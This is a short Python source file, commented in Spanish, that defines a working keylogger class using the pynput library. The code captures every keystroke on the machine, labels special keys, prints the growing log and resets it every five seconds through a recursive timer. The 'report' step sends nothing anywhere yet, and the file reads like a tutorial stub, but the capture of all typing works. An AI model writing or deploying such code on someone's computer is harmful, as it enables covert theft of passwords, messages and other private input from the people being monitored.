#!/usr/bin/env python3

import pynput.keyboard
import threading

class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None

    def pressed_key(self, key):
        try:
            self.log += str(key.char)

        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)

    def report(self):
        self.log = ""

        self.timer  = threading.Timer(5, self.report) # Aplicamos recursividad, la funcion report, se estara llamando a si misma cada 5 seg
        self.timer.start()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # Cada que que se presione una tecla la vamos a "aprocesar" con la funcion pressed_key

        with keyboard_listener: # Creamos un manejador de contextos para que en caso de que algo salga mal el propio manejador cierre el listener
            self.report()
            keyboard_listener.join() # Activa el listener
